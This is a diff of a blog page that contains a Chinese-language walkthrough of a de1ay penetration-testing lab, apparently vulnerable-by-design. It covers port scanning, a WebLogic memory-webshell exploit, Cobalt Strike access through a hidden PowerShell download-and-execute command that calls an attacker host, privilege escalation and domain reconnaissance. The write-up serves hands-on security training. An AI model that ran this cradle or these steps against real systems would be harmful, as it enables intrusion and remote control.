@@ -52,119 +52,57 @@
     <h1>stack2</h1>
     <div class="post-meta">
       <time datetime="2026-04-22T06:33:28.000Z">2026.04.22</time>
-      <span>7 分钟阅读</span>
+      <span>2 分钟阅读</span>
     </div>
   </header>
   <div class="article-content">
-    
-# stack2
-
-.\de1ay密码为123.com
-
-其他用户密码为1qaz@WSX
-
-网络架构：
-
-![image-20260414142226094](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260414142226094.png)
-
-![image-20260414142127683](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260414142127683.png)
-
-## 1.外网打点
-
-nmap扫描网段内存活主机
-
-![image-20260416103100812](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260416103100812.png)
-
-发现两个存活主机192.168.243.80，192.168.243.201
-
-分别进行端口扫描
-
-![image-20260416215849842](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260416215849842.png)
-
-![image-20260416215922847](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260416215922847.png)
-
-192.168.243.80主机开放了80端口，应该是外网服务器，还开放了445，1433，3389，7001端口
-
-1.通过445端口进行渗透
-
-使用永恒之蓝法，连接被重置
-
-![image-20260416194139311](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260416194139311.png)
-
-进入靶机看看，被360拦截
-
-![image-20260416194017478](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260416194017478.png)
-
-2.通过7001端口进行渗透
-
-使用WeblogicScan进行扫描
-
-![image-20260420193538350](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260420193538350.png)
-
-使用WeblogicExploit-GUI注入内存马
-
-![image-20260420202101788](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260420202101788.png)
-
-使用冰蝎连接
-
-![image-20260420202243478](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260420202243478.png)
-
-![image-20260420202305680](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260420202305680.png)
-
-## 2.内网攻击
-
-### 2.1cs+冰蝎
-
-cs创建监听端口并生成反弹shell木马文件，通过冰蝎将文件上传到C:\Windows\Temp，并在虚拟终端执行命令C:\Windows\Temp\name.exe使cs上线
-
- ### 2.2powershell内存注入
-
-![image-20260421001932239](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421001932239.png)
-
-开启一个临时的HTTP服务器
-
-![image-20260421001956580](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421001956580.png)
-
-选择监听器
-
-![image-20260421002032060](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421002032060.png)
-
-点击Launch后生成一段命令
-
+    <h1 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h1><p>.\de1ay密码为123.com</p>
+<p>其他用户密码为1qaz@WSX</p>
+<p>网络架构：</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260414142226094.png" alt="image-20260414142226094"></p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260414142127683.png" alt="image-20260414142127683"></p>
+<h2 id="1-外网打点"><a href="#1-外网打点" class="headerlink" title="1.外网打点"></a>1.外网打点</h2><p>nmap扫描网段内存活主机</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260416103100812.png" alt="image-20260416103100812"></p>
+<p>发现两个存活主机192.168.243.80，192.168.243.201</p>
+<p>分别进行端口扫描</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260416215849842.png" alt="image-20260416215849842"></p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260416215922847.png" alt="image-20260416215922847"></p>
+<p>192.168.243.80主机开放了80端口，应该是外网服务器，还开放了445，1433，3389，7001端口</p>
+<p>1.通过445端口进行渗透</p>
+<p>使用永恒之蓝法，连接被重置</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260416194139311.png" alt="image-20260416194139311"></p>
+<p>进入靶机看看，被360拦截</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260416194017478.png" alt="image-20260416194017478"></p>
+<p>2.通过7001端口进行渗透</p>
+<p>使用WeblogicScan进行扫描</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260420193538350.png" alt="image-20260420193538350"></p>
+<p>使用WeblogicExploit-GUI注入内存马</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260420202101788.png" alt="image-20260420202101788"></p>
+<p>使用冰蝎连接</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260420202243478.png" alt="image-20260420202243478"></p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260420202305680.png" alt="image-20260420202305680"></p>
+<h2 id="2-内网攻击"><a href="#2-内网攻击" class="headerlink" title="2.内网攻击"></a>2.内网攻击</h2><h3 id="2-1cs-冰蝎"><a href="#2-1cs-冰蝎" class="headerlink" title="2.1cs+冰蝎"></a>2.1cs+冰蝎</h3><p>cs创建监听端口并生成反弹shell木马文件，通过冰蝎将文件上传到C:\Windows\Temp，并在虚拟终端执行命令C:\Windows\Temp\name.exe使cs上线</p>
+<h3 id="2-2powershell内存注入"><a href="#2-2powershell内存注入" class="headerlink" title="2.2powershell内存注入"></a>2.2powershell内存注入</h3><p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421001932239.png" alt="image-20260421001932239"></p>
+<p>开启一个临时的HTTP服务器</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421001956580.png" alt="image-20260421001956580"></p>
+<p>选择监听器</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421002032060.png" alt="image-20260421002032060"></p>
+<p>点击Launch后生成一段命令</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.243.3:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
 
-在冰蝎的虚拟终端中执行
-
-![image-20260421002432705](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421002432705.png)
-
-cs上线
-
-![image-20260421002452733](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421002452733.png)
-
-## 3.信息收集
-
-getuid查看当前用户id
-
-![image-20260421112304896](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421112304896.png)
-
-发现不是system权限，使用getsystem提升到system权限
-
-![image-20260421112439087](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421112439087.png)
-
-使用shell ipconfig /all查看网络配置信息
-
-![image-20260421112949846](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421112949846.png)
-
-![image-20260421112845920](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421112845920.png)
-
-域名为de1ay，内网网段为10.10.10.0，域控为10.10.10.10
-
-使用shell net config workstation查看当前计算机的名称，计算机所属的域或工作组， 登录域，其他网络设置
-
-
-
-
-
+<p>在冰蝎的虚拟终端中执行</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421002432705.png" alt="image-20260421002432705"></p>
+<p>cs上线</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421002452733.png" alt="image-20260421002452733"></p>
+<h2 id="3-信息收集"><a href="#3-信息收集" class="headerlink" title="3.信息收集"></a>3.信息收集</h2><p>getuid查看当前用户id</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421112304896.png" alt="image-20260421112304896"></p>
+<p>发现不是system权限，使用getsystem提升到system权限</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421112439087.png" alt="image-20260421112439087"></p>
+<p>使用shell ipconfig &#x2F;all查看网络配置信息</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421112949846.png" alt="image-20260421112949846"></p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260421112845920.png" alt="image-20260421112845920"></p>
+<p>域名为de1ay，内网网段为10.10.10.0，域控为10.10.10.10</p>
+<p>使用shell net config workstation查看当前计算机的名称，计算机所属的域或工作组， 登录域，其他网络设置</p>
 
   </div>
 </article>
